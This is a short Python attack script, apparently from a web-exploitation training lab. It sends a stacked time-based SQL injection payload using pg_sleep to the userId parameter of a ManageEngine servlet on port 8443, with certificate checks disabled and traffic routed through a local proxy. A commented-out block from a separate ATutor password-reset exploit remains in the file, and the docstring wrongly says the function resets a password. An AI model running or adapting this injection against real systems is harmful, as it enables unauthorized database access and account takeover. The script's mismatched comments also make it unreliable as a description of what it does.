#!/bin/env/python3
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def test_inject(ip):
    """
    This will reset the password for the target user
    """
    print('(+) Attempting to inject url')

    #Target URL is: https://%s//servlet/AMUserResourcesSyncServlet?ForMasRange=&userId=?
    url = "https://%s:8443/servlet/AMUserResourcesSyncServlet" % ip
    payload = '1;select+pg_sleep(10);'
    params = {
                "ForMasRange":"1",
                "userId":payload
            }

    proxies = {'http':'http://127.0.0.1:8080'}
    r = requests.get(url, params=params, proxies=proxies, verify=False)
    print(r.text)
    print(r.headers)
    """
    headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
            }

    proxies = {'http':'http://127.0.0.1:8080'}

    s = requests.Session()

    #Need to first go to the "http://atutor/ATutor/password_reminder.php" webpage
    url = 'http://%s/ATutor/password_reminder.php' % (ip)
    r = s.get(url, headers=headers, proxies=proxies)
    res = r.text


    url = 'http://%s/ATutor/password_reminder.php?id=%s&g=%s&h=0' % (ip, str(id), str(gen))

    r = s.get(url, headers=headers, proxies=proxies)
    res = r.text

    if "Enter a new password for your account." in res:
        print('(+) Successful in submitting hash to the password reset form')

    """

def main():
    """
    This is the main function
    """
    if len(sys.argv) != 2:
        print('(+) usage: %s <target_ip> ' % sys.argv[0])
        print('(+) e.g.: %s 192.168.137.113 ' % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    test_inject(ip)

if __name__ == "__main__":
    main()
